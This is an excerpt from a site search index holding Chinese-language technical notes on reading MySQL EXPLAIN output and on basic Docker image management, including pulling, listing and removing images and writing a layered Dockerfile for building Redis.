<p>\u6709\u4e2a\u7279\u4f8b\u662f\u5f53\u4f7f\u7528index\u4e3a\u8bbf\u95ee\u65b9\u6cd5\u65f6\uff0cpossible_keys\u5217\u662f\u7a7a\u7684\u3002\u6b64\u5916\uff0cpossible_keys\u5217\u4e2d\u7684\u503c\u8d8a\u591a\uff0c\u53ef\u80fd\u7528\u5230\u7684\u7d22\u5f15\u5c31\u8d8a\u591a\uff0c\u67e5\u8be2\u4f18\u5316\u5668\u8ba1\u7b97\u67e5\u8be2\u6210\u672c\u65f6\u5c31\u5f97\u82b1\u8d39\u66f4\u591a\u7684\u65f6\u95f4\u53bb\u6bd4\u8f83\uff0c\u5982\u679c\u53ef\u80fd\u7684\u8bdd\uff0c\u5c3d\u91cf\u5220\u9664\u7528\u4e0d\u5230\u7684\u7d22\u5f15\u3002</p> <p>key_len</p> <p>\u8868\u793a\u5f53\u67e5\u8be2\u4f18\u5316\u5668\u51b3\u5b9a\u4f7f\u7528\u67d0\u4e2a\u7d22\u5f15\u6267\u884c\u67e5\u8be2\u65f6\uff0c\u8be5\u7d22\u5f15\u8bb0\u5f55\u7684\u6700\u5927\u957f\u5ea6\uff0c\u8fd9\u4e2a\u6700\u5927\u957f\u5ea6\u662f\u8fd9\u6837\u8ba1\u7b97\u7684:</p> <ul> <li>\u5bf9\u4e8e\u4f7f\u7528\u56fa\u5b9a\u957f\u5ea6\u7c7b\u578b\u7684\u7d22\u5f15\u5217\u6765\u8bf4\uff0c\u5b83\u5b9e\u9645\u5360\u7528\u7684\u5b58\u50a8\u7a7a\u95f4\u6700\u5927\u957f\u5ea6\u5c31\u662f\u8be5\u56fa\u5b9a\u503c</li> <li>\u5bf9\u4e8e\u6307\u5b9a\u5b57\u7b26\u96c6\u7684\u53d8\u957f\u7c7b\u578b\u7684\u7d22\u5f15\u6765\u8bf4\uff0c\u6bd4\u5982VARCHAR(100)-UTF8\uff0c\u90a3\u4e48\u5c31\u662f100*3=300\u5b57\u8282</li> <li>\u5982\u679c\u7d22\u5f15\u5217\u53ef\u4ee5\u5b58\u50a8NULL\u503c\uff0c\u5219key_len\u6bd4\u4e0d\u53ef\u4ee5\u5b58\u50a8\u65f6\u591a1\u4e2a\u5b57\u8282</li> <li>\u5bf9\u4e8e\u53d8\u957f\u5b57\u6bb5\uff0c\u90fd\u4f1a\u67092\u4e2a\u5b57\u8282\u7684\u7a7a\u95f4\u6765\u5b58\u50a8\u8be5\u53d8\u957f\u5217\u7684\u5b9e\u9645\u957f\u5ea6</li> </ul> <p>ref</p> <p>\u5f53\u4f7f\u7528\u7d22\u5f15\u5217\u7b49\u503c\u5339\u914d\u7684\u6761\u4ef6\u53bb\u6267\u884c\u67e5\u8be2\u65f6\uff0c\u5373const\u3001eq_ref\u3001ref\u3001ref_or_null\u3001unique_subquery\u4e4b\u4e00\uff0c\u8be5\u5217\u4f1a\u5c55\u793a\u51fa\u4e0e\u7d22\u5f15\u5217\u505a\u7b49\u503c\u5339\u914d\u7684\u662f\u4e00\u4e2a\u5e38\u6570\u6216\u8005\u662f\u67d0\u4e2a\u5217\u3002\u4f8b\u5982: <pre><code>mysql&gt; EXPLAIN SELECT * FROM s1 WHERE key1 = 'a';\n+----+-------------+-------+------------+------+---------------+----------+---------+-------+------+----------+-------+\n| id | select_type | table | partitions | type | possible_keys | key      | key_len | ref   | rows | filtered | Extra |\n+----+-------------+-------+------------+------+---------------+----------+---------+-------+------+----------+-------+\n|  1 | SIMPLE      | s1    | NULL       | ref  | idx_key1      | idx_key1 | 303     | const |    1 |   100.00 | NULL  |\n+----+-------------+-------+------------+------+---------------+----------+---------+-------+------+----------+-------+\n1 row in set, 1 warning (0.00 sec)\n\nmysql&gt; EXPLAIN SELECT * FROM s1 INNER JOIN s2 ON s1.id = s2.id;\n+----+-------------+-------+------------+--------+---------------+---------+---------+---------------+------+----------+-------+\n| id | select_type | table | partitions | type   | possible_keys | key     | key_len | ref           | rows | filtered | Extra |\n+----+-------------+-------+------------+--------+---------------+---------+---------+---------------+------+----------+-------+\n|  1 | SIMPLE      | s1    | NULL       | ALL    | PRIMARY       | NULL    | NULL    | NULL          |    1 |   100.00 | NULL  |\n|  1 | SIMPLE      | s2    | NULL       | eq_ref | PRIMARY       | PRIMARY | 4       | awesome.s1.id |    1 |   100.00 | NULL  |\n+----+-------------+-------+------------+--------+---------------+---------+---------+---------------+------+----------+-------+\n2 rows in set, 1 warning (0.00 sec)\n</code></pre></p> <p>rows</p> <ul> <li>\u5982\u679c\u67e5\u8be2\u4f18\u5316\u5668\u51b3\u5b9a\u4f7f\u7528\u5168\u8868\u626b\u63cf\u6267\u884c\u67e5\u8be2\u8ba1\u5212\uff0crows\u5217\u4ee3\u8868\u9884\u8ba1\u9700\u8981\u626b\u63cf\u7684\u884c\u6570</li> <li>\u5982\u679c\u67e5\u8be2\u4f18\u5316\u5668\u51b3\u5b9a\u4f7f\u7528\u7d22\u5f15\u6267\u884c\u67e5\u8be2\u8ba1\u5212\uff0crows\u5217\u4ee3\u8868\u9884\u8ba1\u626b\u63cf\u7684\u7d22\u5f15\u8bb0\u5f55\u884c\u6570</li> </ul> <p>filtered</p> <ul> <li>\u5982\u679c\u67e5\u8be2\u4f18\u5316\u5668\u51b3\u5b9a\u4f7f\u7528\u5168\u8868\u626b\u63cf\u6267\u884c\u5355\u8868\u67e5\u8be2\uff0c\u90a3\u4e48\u4f1a\u4f30\u8ba1\u51fa\u6ee1\u8db3\u641c\u7d22\u6761\u4ef6\u7684\u8bb0\u5f55\u6709\u591a\u5c11\u6761</li> <li>\u5982\u679c\u67e5\u8be2\u4f18\u5316\u5668\u51b3\u5b9a\u4f7f\u7528\u7d22\u5f15\u6267\u884c\u5355\u8868\u67e5\u8be2\uff0c\u90a3\u4e48\u4f1a\u4f30\u8ba1\u51fa\u6ee1\u8db3\u9664\u4f7f\u7528\u5230\u5bf9\u5e94\u7d22\u5f15\u7684\u641c\u7d22\u6761\u4ef6\u5916\u7684\u5176\u4ed6\u641c\u7d22\u6761\u4ef6\u7684\u8bb0\u5f55\u6709\u591a\u5c11\u6761\u3002</li> </ul> <p>\u5bf9\u4e8e\u5355\u8868\u67e5\u8be2\uff0cfiltered\u5217\u7684\u503c\u610f\u4e49\u4e0d\u5927\u3002\u4f46\u5bf9\u4e8e\u8fde\u63a5\u67e5\u8be2\uff0c\u4f8b\u5982: <pre><code>mysql&gt; EXPLAIN SELECT * FROM s1 INNER JOIN s2 ON s1.key1 = s2.key1 WHERE s1.common_field = 'a';\n+----+-------------+-------+------------+------+---------------+----------+---------+-------------------+------+----------+-------------+\n| id | select_type | table | partitions | type | possible_keys | key      | key_len | ref               | rows | filtered | Extra       |\n+----+-------------+-------+------------+------+---------------+----------+---------+-------------------+------+----------+-------------+\n|  1 | SIMPLE      | s1    | NULL       | ALL  | idx_key1      | NULL     | NULL    | NULL              | 9688 |    10.00 | Using where |\n|  1 | SIMPLE      | s2    | NULL       | ref  | idx_key1      | idx_key1 | 303     | awesome.s1.key1 |    1 |   100.00 | NULL        |\n+----+-------------+-------+------------+------+---------------+----------+---------+-------------------+------+----------+-------------+\n2 rows in set, 1 warning (0.00 sec)\n</code></pre> \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u9a71\u52a8\u8868s1\u8868\u7684\u6267\u884c\u8ba1\u5212\u7684rows\u5217\u4e3a9688\uff0c filtered\u5217\u4e3a10.00\uff0c\u8fd9\u610f\u5473\u7740\u9a71\u52a8\u8868s1\u7684\u6247\u51fa\u503c\u5c31\u662f<code>9688 \u00d7 10.00% = 968.8</code>\uff0c\u8fd9\u8bf4\u660e\u8fd8\u8981\u5bf9\u88ab\u9a71\u52a8\u8868\u6267\u884c\u5927\u7ea6968\u6b21\u67e5\u8be2\u3002</p> <p>extra</p> <p>\u8be5\u5217\u7528\u6765\u8bf4\u660e\u4e00\u4e9b\u989d\u5916\u4fe1\u606f\uff0c\u6709\u5f88\u591a\u79cd\uff0c\u8fd9\u91cc\u53ea\u5217\u51fa\u6bd4\u8f83\u5e38\u89c1\u7684\u4e00\u4e9b:</p> <p>No tables used\uff0c\u5f53\u67e5\u8be2\u8bed\u53e5\u4e2d\u6ca1\u6709FROM\u5b50\u53e5\u65f6\uff0c\u4e5f\u5c31\u662f\u4e0d\u53bb\u8bfb\u8868\u65f6\u3002</p> <p>Impossible WHERE\uff0c\u5f53WHERE\u5b50\u53e5\u6c38\u8fdc\u4e3aFALSE\u65f6\u63d0\u793a\u3002</p> <p>No matching min/max row\uff0c\u67e5\u8be2\u5217\u8868\u5904\u6709MIN\u6216MAX\u805a\u96c6\u51fd\u6570\uff0c\u4f46\u662f\u6ca1\u6709\u7b26\u5408where\u5b50\u53e5\u4e2d\u641c\u7d22\u6761\u4ef6\u7684\u8bb0\u5f55\u65f6\uff0c\u4f8b\u5982: <pre><code>mysql&gt; EXPLAIN SELECT MIN(key1) FROM s1 WHERE key1 = 'abcdefg';\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-------------------------+\n| id | select_type | table | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra                   |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-------------------------+\n|  1 | SIMPLE      | NULL  | NULL       | NULL | NULL          | NULL | NULL    | NULL | NULL |     NULL | No matching min/max row |\n+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+-------------------------+\n1 row in set, 1 warning (0.00 sec)\n</code></pre></p> <p>Using index\uff0c\u51fa\u73b0\u7d22\u5f15\u8986\u76d6\u800c\u65e0\u9700\u56de\u8868\u65f6\u3002</p> <p>Using index condition\uff0c\u5f53\u67e5\u8be2\u8bed\u53e5\u6267\u884c\u4f1a\u7528\u5230\u7d22\u5f15\u4e0b\u63a8\u65f6\u3002\u4f8b\u5982: <pre><code>mysql&gt; EXPLAIN SELECT * FROM s1 WHERE key1 &gt;'z' AND key1 LIKE '%b';\n+----+-------------+-------+------------+-------+---------------+----------+---------+------+------+----------+-----------------------+\n| id | select_type | table | partitions | type  | possible_keys | key      | key_len | ref  | rows | filtered | Extra                 |\n+----+-------------+-------+------------+-------+---------------+----------+---------+------+------+----------+-----------------------+\n|  1 | SIMPLE      | s1    | NULL       | range | idx_key1      | idx_key1 | 303     | NULL |    1 |   100.00 | Using index condition |\n+----+-------------+-------+------------+-------+---------------+----------+---------+------+------+----------+-----------------------+\n1 row in set, 1 warning (0.00 sec)\n</code></pre></p> <p><code>key1 &gt;'z'</code>\u80fd\u4f7f\u7528\u5230\u7d22\u5f15\uff0c\u800c<code>key1 LIKE '%b'</code>\u4e0d\u80fd\u3002\u5b83\u7684\u6267\u884c\u8fc7\u7a0b\u662f\u6839\u636e<code>key1 &gt;'z'</code>\u8fd9\u4e2a\u6761\u4ef6\uff0c\u5b9a\u4f4d\u5230\u4e8c\u7ea7\u7d22\u5f15idx_key1\u4e2d\u5bf9\u5e94\u7684\u4e8c\u7ea7\u7d22\u5f15\u8bb0\u5f55\uff1b\u5bf9\u4e8e\u8fd9\u4e9b\u8bb0\u5f55\u5148\u4e0d\u53bb\u56de\u8868\uff0c\u800c\u662f\u5148\u68c0\u6d4b\u662f\u5426\u6ee1\u8db3<code>key1 LIKE '%b'</code>\u8fd9\u4e2a\u6761\u4ef6\uff1b\u6ee1\u8db3\u6761\u4ef6\u7684\u624d\u6267\u884c\u56de\u8868\u64cd\u4f5c\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u5c31\u53eb\u200b\u7d22\u5f15\u4e0b\u63a8\u3002</p> <p>Using where\uff0c\u5f53\u5168\u8868\u626b\u63cf\u4e14where\u5b50\u53e5\u6709\u9488\u5bf9\u8be5\u8868\u7684\u641c\u7d22\u6761\u4ef6\u65f6\uff0c\u6216\u7d22\u5f15\u8bbf\u95ee\u4f46where\u5b50\u53e5\u6709\u7d22\u5f15\u5217\u4e4b\u5916\u7684\u5176\u4ed6\u641c\u7d22\u6761\u4ef6\u65f6\u3002\u4f8b\u5982: <pre><code>mysql&gt; EXPLAIN SELECT * FROM s1 WHERE key1 ='a' AND common_field = 'a';\n+----+-------------+-------+------------+------+---------------+----------+---------+-------+------+----------+-------------+\n| id | select_type | table | partitions | type | possible_keys | key      | key_len | ref   | rows | filtered | Extra       |\n+----+-------------+-------+------------+------+---------------+----------+---------+-------+------+----------+-------------+\n|  1 | SIMPLE      | s1    | NULL       | ref  | idx_key1      | idx_key1 | 303     | const |    1 |   100.00 | Using where |\n+----+-------------+-------+------------+------+---------------+----------+---------+-------+------+----------+-------------+\n1 row in set, 1 warning (0.00 sec)\n</code></pre></p> <p>Using join buffer (Block Nested Loop)\uff0c\u8fde\u63a5\u67e5\u8be2\u65f6\uff0c\u88ab\u9a71\u52a8\u8868\u4e0d\u80fd\u6709\u6548\u5229\u7528\u7d22\u5f15\u52a0\u5feb\u8bbf\u95ee\u901f\u5ea6\u65f6\uff0cjoin buffer\u53ef\u4ee5\u51cf\u5c11\u8bbf\u95ee\u88ab\u9a71\u52a8\u8868\u7684\u6b21\u6570\u3002</p> <p>Not exists\uff0c\u4f7f\u7528\u5916\u8fde\u63a5\u65f6\uff0cwhere\u5b50\u53e5\u8981\u6c42\u88ab\u9a71\u52a8\u8868\u67d0\u5217\u4e3aNULL\uff0c\u4f46\u8be5\u5217\u4e0d\u5141\u8bb8\u5b58NULL\u503c\u65f6\u3002</p> <p>Using intersect(...)\u3001Using union(...)\u3001Usingsort_union(...)\uff0c\u7d22\u5f15\u5408\u5e76\u65f6\u4f1a\u51fa\u73b0\u3002</p> <p>Zero limit\uff0c\u5f53\u6211\u4eec\u7684LIMIT\u5b50\u53e5\u7684\u53c2\u6570\u4e3a0\u65f6\uff0c\u8868\u793a\u538b\u6839\u513f\u4e0d\u6253\u7b97\u4ece\u8868\u4e2d\u8bfb\u51fa\u4efb\u4f55\u8bb0\u5f55\u3002</p> <p>Using filesort\uff0c\u5f53\u65e0\u6cd5\u4f7f\u7528\u7d22\u5f15\u6392\u5e8f\uff0c\u53ea\u80fd\u4f7f\u7528\u5185\u5b58\u6216\u786c\u76d8\u6392\u5e8f\u65f6\u3002</p> <p>Using temporary\uff0c\u5f53\u67e5\u8be2\u6267\u884c\u53ef\u80fd\u501f\u52a9\u4e34\u65f6\u8868\u6765\u5b8c\u6210\u4e00\u4e9b\u529f\u80fd\uff0c\u5982\u53bb\u91cd\u3001\u6392\u5e8f\u4e4b\u7c7b\u7684\u65f6\u3002</p> <p>Start temporary, End temporary\uff0cLooseScan\uff0cFirstMatch(tbl_name)\uff0c\u67e5\u8be2\u4f18\u5316\u5668\u4f1a\u5c1d\u8bd5\u5c06IN\u5b50\u67e5\u8be2\u8f6c\u6362\u6210semi-join\uff0c\u5f53semi-join\u7684\u6267\u884c\u7b56\u7565\u4e3aDuplicateWeedout\u65f6\uff0c\u9a71\u52a8\u8868\u663e\u793aStart temporary\uff0c\u88ab\u9a71\u52a8\u8868\u663e\u793aEnd temporary\uff1b\u5f53semi-join\u7684\u6267\u884c\u7b56\u7565\u662fLooseScan\u65f6\uff0c\u5c31\u663e\u793aLooseScan\uff1b\u5f53semi-join\u7684\u6267\u884c\u7b56\u7565\u662fFirstMatch\u65f6\uff0c\u5c31\u663e\u793aFirstMatch(tbl_name)\u3002</p>"},{"location":"other/docker/","title":"Docker\u6982\u8981","text":""},{"location":"other/docker/#_1","title":"\u955c\u50cf","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u5206\u4e3a\u5185\u6838\u7a7a\u95f4\u548c\u7528\u6237\u7a7a\u95f4\u3002\u5bf9\u4e8eLinux\uff0c\u5185\u6838\u542f\u52a8\u540e\uff0c\u4f1a\u6302\u8f7droot\u6587\u4ef6\u7cfb\u7edf\u4e3a\u5176\u63d0\u4f9b\u7528\u6237\u7a7a\u95f4\u652f\u6301\u3002\u800cDocker\u4e2d\u7684\u955c\u50cf(Image)\uff0c\u5c31\u76f8\u5f53\u4e8e\u662f\u4e00\u4e2aroot\u6587\u4ef6\u7cfb\u7edf\uff0c\u53ea\u662f\u5b83\u6709\u4e9b\u7279\u6b8a\uff0c\u9664\u4e86\u63d0\u4f9b\u5bb9\u5668\u8fd0\u884c\u65f6\u6240\u9700\u7684\u7a0b\u5e8f\u3001\u5e93\u3001\u8d44\u6e90\u3001\u914d\u7f6e\u7b49\u6587\u4ef6\u5916\uff0c\u8fd8\u4f1a\u5305\u542b\u4e00\u4e9b\u4e3a\u8fd0\u884c\u65f6\u51c6\u5907\u7684\u914d\u7f6e\u53c2\u6570(\u5982\u533f\u540d\u5377\u3001\u73af\u5883\u53d8\u91cf\u3001\u7528\u6237\u7b49)\u3002\u955c\u50cf\u4e0d\u5305\u542b\u4efb\u4f55\u52a8\u6001\u6570\u636e\uff0c\u5176\u5185\u5bb9\u5728\u6784\u5efa\u4e4b\u540e\u4e0d\u4f1a\u6539\u53d8\u3002</p> <p>Docker\u4f7f\u7528Union FS\u6280\u672f\uff0c\u5c06\u955c\u50cf\u8bbe\u8ba1\u4e3a\u5206\u5c42\u5b58\u50a8\u7684\u67b6\u6784\u3002\u6784\u5efa\u65f6\uff0c\u4f1a\u4e00\u5c42\u5c42\u6784\u5efa\uff0c\u524d\u4e00\u5c42\u662f\u540e\u4e00\u5c42\u7684\u57fa\u7840\uff0c\u6bcf\u5c42\u6784\u5efa\u5b8c\u5c31\u4e0d\u4f1a\u6539\u53d8\uff0c\u540e\u4e00\u5c42\u7684\u4efb\u4f55\u6539\u53d8\u53ea\u662f\u53d1\u751f\u5728\u81ea\u5df1\u8fd9\u4e00\u5c42\u3002\u4f8b\u5982\uff0c\u5220\u9664\u524d\u4e00\u5c42\u7684\u6587\u4ef6\u5e76\u4e0d\u662f\u771f\u6b63\u7684\u5220\u9664\uff0c\u800c\u53ea\u662f\u5728\u672c\u5c42\u4e2d\u6807\u8bb0\u4e0a\u4e00\u5c42\u7684\u6587\u4ef6\u662f\u5220\u9664\u7684\u3002</p>"},{"location":"other/docker/#_2","title":"\u83b7\u53d6\u955c\u50cf","text":"<p>\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\u53ef\u4ee5\u4ece\u955c\u50cf\u4ed3\u5e93\u4e2d\u62c9\u53d6\u955c\u50cf: <pre><code>docker pull [\u9009\u9879] [\u955c\u50cf\u4ed3\u5e93\u7684\u5730\u5740[:\u7aef\u53e3\u53f7]/]\u4ed3\u5e93\u540d[:\u6807\u7b7e]\n</code></pre> \u955c\u50cf\u4ed3\u5e93\u7684\u5730\u5740\u9ed8\u8ba4\u4e3aDocker Hub\u7684\u5730\u5740\uff0c\u5bf9\u4e8eDocker Hub\uff0c\u4ed3\u5e93\u540d\u9ed8\u8ba4\u4e3alibrary\uff0c\u6240\u4ee5\u6211\u4eec\u5f80\u5f80\u53ef\u4ee5\u7b80\u5199\u4e3a<code>docker pull ubuntu:18.04</code>\u3002</p>"},{"location":"other/docker/#_3","title":"\u5217\u51fa\u955c\u50cf","text":"<p>\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u5217\u51fa\u5168\u90e8\u7684\u955c\u50cf: <pre><code>PS C:\\Users\\hejl&gt; docker image ls\nREPOSITORY                                       TAG                 IMAGE ID            CREATED             SIZE\nhjlarry/cheers2019                               latest              f0c36061dc59        3 hours ago         4.01MB\n&lt;none&gt;                                           &lt;none&gt;              1487cd0b23aa        3 hours ago         356MB\nubuntu                                           18.04               ccc6e87d482b        4 days ago          64.2MB\nubuntu                                           latest              ccc6e87d482b        4 days ago          64.2MB\ngolang                                           1.11-alpine         e116d2efa2ab        5 months ago        312MB\ngcr.azk8s.cn/google_containers/hyperkube-amd64   v1.9.2              583687acb4de        2 years ago         618MB\n</code></pre> \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u955c\u50cfID\u662f\u955c\u50cf\u7684\u552f\u4e00\u6807\u8bc6\uff0c\u4f46\u6807\u7b7e\u53ef\u4ee5\u6709\u591a\u4e2a\uff0c\u4f8b\u5982ubuntu\u768418.04\u548clatest\u662f\u540c\u4e00\u4e2a\u955c\u50cf\u3002</p> <p>\u955c\u50cf\u7684\u4f53\u79ef\u53ef\u80fd\u4f1a\u6bd4Docker Hub\u4e2d\u663e\u793a\u7684\u8981\u5927\u4e00\u4e9b\uff0c\u56e0\u4e3aDocker Hub\u8fdb\u884c\u4e86\u4e00\u5b9a\u7684\u538b\u7f29\u3002\u5b9e\u9645\u8fd9\u4e9b\u955c\u50cf\u5360\u7528\u7684\u603b\u7a7a\u95f4\u4e5f\u4e0d\u662f\u628a\u4ed6\u4eec\u52a0\u8d77\u6765\u5c31\u80fd\u7b97\u51fa\u6765\uff0c\u56e0\u4e3a\u5171\u540c\u7684\u5c42\u53ef\u4ee5\u590d\u7528\u3002\u955c\u50cf\u5360\u7528\u7684\u603b\u5927\u5c0f\u53ef\u4ee5\u901a\u8fc7<code>docker system df</code>\u770b\u5230\u3002</p> <p>\u6709\u4e00\u79cd\u7279\u6b8a\u7684\u955c\u50cf\uff0c\u955c\u50cf\u540d\u548c\u6807\u7b7e\u5747\u4e3a\uff0c\u88ab\u79f0\u4e3a\u865a\u60ac\u955c\u50cf(dangling image)\u3002\u5b83\u4eec\u6ca1\u6709\u4ec0\u4e48\u7528\uff0c\u53ef\u4ee5\u901a\u8fc7<code>docker image prune</code>\u4e00\u952e\u5220\u9664\u3002 <p>\u8fd8\u6709\u4e00\u79cd\u955c\u50cf\u53eb\u4e2d\u95f4\u5c42\u955c\u50cf\uff0c\u7528\u6765\u52a0\u901f\u6784\u5efa\u3001\u91cd\u590d\u5229\u7528\u8d44\u6e90\uff0c\u6709\u7684\u4e2d\u95f4\u5c42\u955c\u50cf\u4e5f\u6ca1\u6709\u6807\u7b7e\u548c\u540d\u79f0\uff0c\u5b83\u4eec\u4e0d\u80fd\u88ab\u5220\u9664\u3002\u53ef\u4ee5\u901a\u8fc7<code>docker image ls -a</code>\u89c2\u5bdf\u5230\u5305\u542b\u4e2d\u95f4\u5c42\u955c\u50cf\u7684\u6240\u6709\u955c\u50cf\u3002</p>"},{"location":"other/docker/#_4","title":"\u5220\u9664\u955c\u50cf","text":"<p>\u4f7f\u7528<code>docker image rm &lt;\u955c\u50cf1&gt; [&lt;\u955c\u50cf2&gt; ...]</code>\u547d\u4ee4\u53ef\u5220\u9664\u955c\u50cf\u3002\u8fd9\u91cc\u65e2\u53ef\u4ee5\u7528\u955c\u50cf\u7684\u540d\u79f0\uff0c\u4e5f\u5c31\u662f<code>&lt;\u4ed3\u5e93\u540d&gt;:&lt;\u6807\u7b7e&gt;</code>\u6765\u8868\u793a\u955c\u50cf\uff1b\u4e5f\u53ef\u4ee5\u7528\u955c\u50cf\u7684ID\uff0c\u4e00\u822c\u53d6\u524d3\u4f4d\uff0c\u8db3\u4ee5\u533a\u5206\u51fa\u522b\u7684\u955c\u50cf\u5373\u53ef\u3002</p> <p>\u5728\u5220\u9664\u955c\u50cf\u65f6\uff0c\u6211\u4eec\u5f80\u5f80\u4f1a\u770b\u5230\u5220\u9664\u4fe1\u606f\u4e2d\u65e2\u6709<code>Untagged</code>\uff0c\u4e5f\u6709<code>Deleted</code>\u3002<code>Untagged</code>\u5b9e\u9645\u4e0a\u662f\u56e0\u4e3a\u6211\u4eec\u8981\u5220\u9664\u7684\u662f\u67d0\u4e2atag\u6807\u7b7e\u4e0b\u7684\u955c\u50cf\uff0c\u9700\u8981\u53bb\u53d6\u6d88\u6807\u7b7e\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528\u591a\u4e2a\u547d\u4ee4\u914d\u5408\u6765\u6279\u91cf\u5220\u9664\u4e00\u4e9b\u955c\u50cf\uff0c\u4f8b\u5982<code>docker image rm $(docker image ls -q redis)</code>\u53ef\u4ee5\u5220\u9664\u6240\u6709\u4ed3\u5e93\u540d\u4e3aredis\u7684\u955c\u50cf\uff0c<code>docker image rm $(docker image ls -q -f before=mongo:3.2)</code>\u53ef\u4ee5\u5220\u9664\u6240\u6709mongo\u7248\u672c3.2\u4e4b\u524d\u7684\u955c\u50cf\u3002</p>"},{"location":"other/docker/#_5","title":"\u5b9a\u5236\u955c\u50cf","text":"<p>\u955c\u50cf\u7684\u5b9a\u5236\u5b9e\u9645\u4e0a\u5c31\u662f\u5b9a\u5236\u6bcf\u5c42\u6240\u6dfb\u52a0\u7684\u914d\u7f6e\u548c\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u6bcf\u4e00\u5c42\u7684\u4fee\u6539\u3001\u5b89\u88c5\u3001\u6784\u5efa\u3001\u64cd\u4f5c\u7684\u547d\u4ee4\u90fd\u5199\u5165\u4e00\u4e2aDockerfile\uff0c\u901a\u8fc7\u5b83\u6765\u6784\u5efa\u3001\u5b9a\u5236\u955c\u50cf\u3002</p> <p>FROM</p> <p>\u7528\u6765\u6307\u5b9a\u57fa\u7840\u955c\u50cf\u3002\u5b9a\u5236\u955c\u50cf\u4e00\u5b9a\u662f\u4ee5\u4e00\u4e2a\u955c\u50cf\u4e3a\u57fa\u7840\uff0c\u5728\u5176\u4e0a\u8fdb\u884c\u5b9a\u5236\uff0cFROM\u662f\u5fc5\u5907\u7684\u4e14\u5fc5\u987b\u662f\u7b2c\u4e00\u6761\u6307\u4ee4\u3002</p> <p>\u6211\u4eec\u4e00\u822c\u53ef\u4ee5\u7528\u4e00\u4e9b\u670d\u52a1\u7c7b\u7684\u955c\u50cf\u4f5c\u4e3a\u57fa\u7840\u955c\u50cf\uff0c\u4f8b\u5982nginx\u3001redis\u3001python\u3001golang\u7b49\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u66f4\u4e3a\u57fa\u7840\u7684\u64cd\u4f5c\u7cfb\u7edf\u955c\u50cf\uff0c\u5982ubuntu\u3001centos\u3001alpine\u7b49\u3002\u8fd8\u4ee5\u4e3a\u7528scratch\u4f5c\u4e3a\u57fa\u7840\u955c\u50cf\uff0c\u5b83\u8868\u793a\u4e00\u4e2a\u7a7a\u767d\u7684\u955c\u50cf\uff0c\u63a5\u4e0b\u6765\u6240\u5199\u7684\u6307\u4ee4\u4e3a\u955c\u50cf\u7684\u7b2c\u4e00\u5c42\uff0c\u56e0\u4e3a\u6709\u4e00\u4e9b\u9759\u6001\u7f16\u8bd1\u7684\u7a0b\u5e8f\u5e76\u4e0d\u9700\u8981\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u8fd0\u884c\u65f6\u652f\u6301\u3002</p> <p>RUN</p> <p>\u7528\u6765\u6267\u884c\u547d\u4ee4\u884c\u547d\u4ee4\u7684\uff0c\u53ef\u4ee5\u50cfshell\u811a\u672c\u4e00\u6837\u4f7f\u7528\uff0c\u4f46\u6211\u4eec\u4e0d\u5e94\u8be5\u628a\u6bcf\u4e2a\u547d\u4ee4\u90fd\u53bb\u5bf9\u5e94\u4e00\u4e2aRUN\uff0c\u4f8b\u5982: <pre><code>FROM debian:stretch\n\nRUN apt-get update\nRUN apt-get install -y gcc libc6-dev make wget\nRUN wget -O redis.tar.gz \"http://download.redis.io/releases/redis-5.0.3.tar.gz\"\nRUN mkdir -p /usr/src/redis\nRUN tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1\nRUN make -C /usr/src/redis\nRUN make -C /usr/src/redis install\n</code></pre> \u8fd9\u6837\u6784\u5efa\u7684\u955c\u50cf\u975e\u5e38\u81c3\u80bf\uff0c\u6dfb\u52a0\u4e86\u5f88\u591a\u8fd0\u884c\u65f6\u4e0d\u9700\u8981\u7684\u4e1c\u897f\uff0c\u589e\u52a0\u4e86\u6784\u5efa\u90e8\u7f72\u7684\u65f6\u95f4\uff0c\u4e5f\u5bb9\u6613\u51fa\u9519\u3002\u5e94\u8be5\u8fd9\u6837\u5199: <pre><code>FROM debian:stretch\n\nRUN buildDeps='gcc libc6-dev make wget' \\\n    &amp;&amp; apt-get update \\\n    &amp;&amp; apt-get install -y $buildDeps \\\n    &amp;&amp; wget -O redis.tar.gz \"http://download.redis.io/releases/redis-5.0.3.tar.gz\" \\\n    &amp;&amp; mkdir -p /usr/src/redis \\\n    &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \\\n    &amp;&amp; make -C /usr/src/redis \\\n    &amp;&amp; make -C /usr/src/redis install \\\n    &amp;&amp; rm -rf /var/lib/apt/lists/* \\\n    &amp;&amp; rm redis.tar.gz \\\n    &amp;&amp; rm -r /usr/src/redis \\\n    &amp;&amp; apt-get purge -y --auto-remove $buildDeps\n</code></pre> \u6240\u6709\u7684\u547d\u4ee4\u90fd\u662f\u4e00\u4e2a\u76ee\u7684\uff0c\u5373\u7f16\u8bd1\u3001\u5b89\u88c5redis\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u6ca1\u5fc5\u8981\u591a\u5c42\u3002\u6b64\u5916\uff0c\u8fd9\u7ec4\u547d\u4ee4\u7684\u6700\u540e\u6dfb\u52a0\u4e86\u6e05\u7406\u5de5\u4f5c\u7684\u547d\u4ee4\uff0c\u5220\u9664\u4e3a\u4e86\u7f16\u8bd1\u6784\u5efa\u6240\u9700\u7684\u6587\u4ef6\uff0c\u6e05\u7406\u4e86\u6240\u6709\u4e0b\u8f7d\u3001\u5c55\u5f00\u7684\u6587\u4ef6\uff0c\u8fd8\u6e05\u7406\u4e86apt\u7684\u7f13\u5b58\u6587\u4ef6\u3002\u955c\u50cf\u6784\u5efa\u65f6\uff0c\u4e00\u5b9a\u8981\u786e\u4fdd\u6bcf\u4e00\u5c42\u53ea\u6dfb\u52a0\u771f\u6b63\u9700\u8981\u6dfb\u52a0\u7684\u4e1c\u897f\uff0c\u4efb\u4f55\u65e0\u5173\u7684\u4e1c\u897f\u90fd\u5e94\u8be5\u6e05\u7406\u6389\u3002</p> 